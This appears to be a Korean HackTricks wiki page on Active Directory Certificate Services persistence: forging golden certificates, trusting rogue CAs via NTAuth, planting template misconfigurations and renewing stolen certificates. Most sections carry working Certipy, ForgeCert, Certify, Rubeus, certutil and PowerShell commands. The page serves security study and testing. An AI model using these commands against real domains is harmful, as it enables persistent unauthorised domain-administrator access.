# AD CS 도메인 지속성

{{#include ../../../banners/hacktricks-training.md}}

**다음은 [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)에 소개된 도메인 지속성 기법을 요약한 내용입니다**. 자세한 내용은 해당 문서를 확인하세요.<sup>[[5]](#references)</sup>

## 탈취한 CA 인증서로 인증서 위조하기 (Golden Certificate) - DPERSIST1

인증서가 CA 인증서인지 어떻게 알 수 있을까요?

다음 조건 중 여러 가지를 충족하면 해당 인증서가 CA 인증서임을 확인할 수 있습니다.<sup>[[5]](#references)</sup>

- 인증서가 CA 서버에 저장되어 있고, 개인 키는 시스템의 DPAPI 또는 운영 체제에서 지원하는 TPM/HSM과 같은 하드웨어로 보호됩니다.
- 인증서의 Issuer 필드와 Subject 필드가 모두 CA의 distinguished name과 일치합니다.
- "CA Version" 확장 필드는 CA 인증서에만 존재합니다.
- 인증서에 EKU(Extended Key Usage) 필드가 없습니다.

이 인증서의 개인 키를 추출할 때는 CA 서버에서 `certsrv.msc` 도구의 기본 GUI를 사용하는 것이 공식적으로 지원되는 방법입니다. 하지만 이 인증서는 시스템에 저장된 다른 인증서와 다르지 않으므로, [THEFT2 기법](certificate-theft.md#user-certificate-theft-via-dpapi-theft2)과 같은 방법으로 추출할 수 있습니다.

다음 명령을 사용하면 Certipy로 인증서와 개인 키를 가져올 수도 있습니다.<sup>[[2]](#references)</sup>

```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```

CA 인증서와 개인 키를 `.pfx` 형식으로 확보한 후에는 [ForgeCert](https://github.com/GhostPack/ForgeCert) 같은 도구를 사용해 유효한 인증서를 생성할 수 있습니다:

```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```

> [!WARNING]
> 인증서 위조 대상 사용자는 프로세스가 성공하려면 활성 상태여야 하며 Active Directory에서 인증할 수 있어야 합니다. krbtgt와 같은 특수 계정의 인증서를 위조하는 것은 효과가 없습니다.

위조한 이 인증서는 지정된 만료일까지, 그리고 루트 CA 인증서가 유효한 동안 **유효**합니다(보통 5년에서 **10년 이상**). 또한 **컴퓨터 계정에도 유효**하므로 **S4U2Self**와 결합하면 공격자는 CA 인증서가 유효한 동안 **도메인의 모든 컴퓨터에서 persistence를 유지할 수 있습니다**.\
또한 이 방법으로 **생성한 인증서는** CA가 이를 인지하지 못하므로 **폐기할 수 없습니다**.

### Strong Certificate Mapping Enforcement 환경에서의 동작(2025년 이후)

2025년 2월 11일 이후(KB5014754 배포 후), 도메인 컨트롤러는 인증서 매핑에 대해 기본적으로 **Full Enforcement**를 적용합니다. 실제로는 위조한 인증서가 다음 중 하나를 충족해야 합니다.

- 대상 계정에 대한 강력한 바인딩(예: SID 보안 확장)을 포함하거나
- 대상 개체의 `altSecurityIdentities` 특성에 명시적이고 강력한 매핑을 추가해야 합니다.<sup>[[1]](#references)</sup>

persistence를 위한 신뢰할 수 있는 방법은 탈취한 Enterprise CA에 연결되는 위조 인증서를 발급한 다음, 피해자 주체에 명시적이고 강력한 매핑을 추가하는 것입니다.

```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```

노트
- SID security extension을 포함하는 forged certificates를 제작할 수 있다면, Full Enforcement에서도 암묵적으로 매핑됩니다. 그렇지 않다면 명시적 strong mappings를 우선하세요. 명시적 매핑에 대한 자세한 내용은 [account-persistence](account-persistence.md)를 참조하세요.
- 여기서 revocation은 방어자에게 도움이 되지 않습니다. forged certificates는 CA database에 존재하지 않으므로 revoke할 수 없습니다.

#### Full-Enforcement 호환 forging (SID-aware)

업데이트된 tooling을 사용하면 SID를 직접 삽입할 수 있어, DCs가 weak mappings를 거부하더라도 golden certificates를 계속 사용할 수 있습니다:<sup>[[3]](#references)</sup>

```bash
# Certify 2.0 integrates ForgeCert and can embed SID
Certify.exe forge --ca-pfx CORP-DC-CA.pfx --ca-pass Password123! \
  --upn administrator@corp.local --sid S-1-5-21-1111111111-2222222222-3333333333-500 \
  --outfile administrator_sid.pfx

# Certipy also supports SID in forged certs
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local \
  -sid S-1-5-21-1111111111-2222222222-3333333333-500 -out administrator_sid.pfx
```

SID를 임베드하면 모니터링 대상일 수 있는 `altSecurityIdentities`를 건드리지 않으면서도 강력한 매핑 검사를 통과할 수 있습니다.

## Rogue CA Certificates 신뢰 - DPERSIST2

`NTAuthCertificates` 객체는 Active Directory(AD)에서 사용하는 하나 이상의 **CA certificates**를 `cacertificate` 속성에 포함하도록 정의되어 있습니다. **domain controller**의 검증 과정에서는 인증 중인 **certificate**의 Issuer 필드에 지정된 **CA**와 일치하는 항목이 `NTAuthCertificates` 객체에 있는지 확인합니다. 일치하는 항목이 있으면 인증이 진행됩니다.<sup>[[5]](#references)</sup>

공격자는 이 AD 객체를 제어할 수 있다면 자체 서명된 CA certificate를 `NTAuthCertificates` 객체에 추가할 수 있습니다. 일반적으로 **Enterprise Admin** 그룹의 구성원과 **forest root의 도메인**에 속한 **Domain Admins** 또는 **Administrators**만 이 객체를 수정할 권한이 있습니다. 이들은 `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA` 명령을 사용하거나 [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool)을 이용해 `NTAuthCertificates` 객체를 편집할 수 있습니다.

이 기법에 유용한 추가 명령:

```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```

이 기능은 특히 ForgeCert를 사용해 인증서를 동적으로 생성하는 앞서 설명한 방법과 함께 사용할 때 유용합니다.

> 2025년 이후 매핑 고려 사항: rogue CA를 NTAuth에 추가하면 발급 CA에 대한 신뢰만 설정됩니다. DC가 **Full Enforcement** 상태일 때 로그온에 leaf 인증서를 사용하려면, leaf에 SID 보안 확장명이 포함되어 있거나 대상 객체에 강력한 명시적 매핑(예: `altSecurityIdentities`의 Issuer+Serial)이 있어야 합니다. {{#ref}}account-persistence.md{{#endref}}를 참조하세요.

## 악의적인 잘못된 구성 - DPERSIST3

AD CS 구성 요소의 **security descriptor 수정**을 통한 **persistence** 기회는 많습니다. "[Domain Escalation](domain-escalation.md)" 섹션에서 설명한 수정은 상승된 액세스 권한을 가진 공격자가 악의적으로 구현할 수 있습니다. 여기에는 다음과 같은 민감한 구성 요소에 "control rights"(예: WriteOwner/WriteDACL 등)를 추가하는 작업이 포함됩니다.<sup>[[5]](#references)</sup>

- **CA server의 AD computer** 객체
- **CA server의 RPC/DCOM server**
- **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** 아래의 모든 **하위 AD 객체 또는 컨테이너**(예: Certificate Templates 컨테이너, Certification Authorities 컨테이너, NTAuthCertificates 객체 등)
- 조직이 CA 또는 템플릿 제어 권한을 명시적으로 위임한 **AD 그룹**. 기본 제공 Cert Publishers 그룹은 AD의 사용자 객체에 인증서를 게시할 권한이 있지만, 그룹에 가입하는 것만으로 CA 또는 템플릿 제어 권한이나 등록 권한을 얻을 수는 없습니다. 관련 CA 및 템플릿 권한은 각각 별도로 확인하세요. [Microsoft's description of Cert Publishers](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers) 및 [certificate template permissions](https://learn.microsoft.com/en-us/intune/configmgr/protect/plan-design/planning-for-certificate-template-permissions)를 참조하세요.

악의적인 구현의 예로, 도메인에서 **상승된 권한**을 가진 공격자가 기본 **`User`** 인증서 템플릿에 **`WriteOwner`** 권한을 추가하고, 해당 권한의 주체로 자신을 지정하는 경우를 들 수 있습니다. 이를 악용하려면 공격자는 먼저 **`User`** 템플릿의 소유자를 자신으로 변경합니다. 그런 다음 템플릿에서 **`mspki-certificate-name-flag`**를 **1**로 설정해 **`ENROLLEE_SUPPLIES_SUBJECT`**를 활성화하면, 사용자가 요청에 Subject Alternative Name을 지정할 수 있습니다. 이후 공격자는 **템플릿**을 사용해 **등록**하면서 대체 이름으로 **domain administrator** 이름을 선택하고, 획득한 인증서로 DA 자격으로 인증할 수 있습니다.

공격자가 장기적인 도메인 persistence를 위해 설정할 수 있는 실질적인 항목은 다음과 같습니다(자세한 내용과 탐지 방법은 {{#ref}}domain-escalation.md{{#endref}} 참조).

- 요청자가 SAN을 지정하도록 허용하는 CA 정책 플래그(예: `EDITF_ATTRIBUTESUBJECTALTNAME2` 활성화). 이를 통해 ESC1과 유사한 경로를 계속 악용할 수 있습니다.
- 인증에 사용할 수 있는 인증서 발급을 허용하는 템플릿 DACL 또는 설정(예: Client Authentication EKU 추가, `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` 활성화).
- `NTAuthCertificates` 객체 또는 CA 컨테이너를 제어해 방어자가 정리 작업을 시도하더라도 rogue 발급자를 계속 다시 추가할 수 있도록 합니다.

> [!TIP]
> KB5014754 적용 후 강화된 환경에서는 이러한 잘못된 구성과 명시적 강력 매핑(`altSecurityIdentities`)을 함께 사용하면, DC가 강력한 매핑을 강제하더라도 발급 또는 위조된 인증서를 계속 사용할 수 있습니다.

### 지속성을 위한 인증서 갱신 악용(ESC14)

인증에 사용할 수 있는 인증서(또는 Enrollment Agent 인증서)를 침해하면, 발급 템플릿이 계속 게시되어 있고 CA가 발급자 체인을 계속 신뢰하는 한 **무기한 갱신**할 수 있습니다. 갱신하면 원래의 ID 바인딩을 유지하면서 유효 기간이 연장되므로, 템플릿을 수정하거나 CA를 다시 게시하지 않으면 접근을 차단하기 어렵습니다.<sup>[[4]](#references)</sup>

```bash
# Renew a stolen user cert to extend validity
certipy req -ca CORP-DC-CA -template User -pfx stolen_user.pfx -renew -out user_renewed_2026.pfx

# Renew an on-behalf-of cert issued via an Enrollment Agent
certipy req -ca CORP-DC-CA -on-behalf-of 'CORP/victim' -pfx agent.pfx -renew -out victim_renewed.pfx
```

도메인 컨트롤러가 **Full Enforcement** 상태라면, 갱신된 leaf certificate가 `altSecurityIdentities`를 건드리지 않고도 계속 강력하게 매핑되도록 `-sid <victim SID>`를 추가하거나 SID security extension이 계속 포함되는 template을 사용하세요. CA admin 권한이 있는 공격자는 자신에게 cert를 발급하기 전에 `policy\RenewalValidityPeriodUnits`를 조정해 갱신되는 cert의 유효 기간을 늘릴 수도 있습니다.<sup>[[2]](#references)[[4]](#references)</sup>


## References

- [1] [Microsoft KB5014754 – Windows 도메인 컨트롤러의 인증서 기반 인증 변경 사항(적용 일정 및 강력한 매핑)](https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [2] [Certipy – 명령 참조 및 forge/auth 사용법](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [3] [SpecterOps – Certify 2.0(SID 지원 기능이 통합된 forge)](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [ESC14 갱신 악용 개요](https://www.adcs-security.com/attacks/esc14)
- [5] [SpecterOps – Certified Pre-Owned: Active Directory Certificate Services 악용하기](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)
{{#include ../../../banners/hacktricks-training.md}}
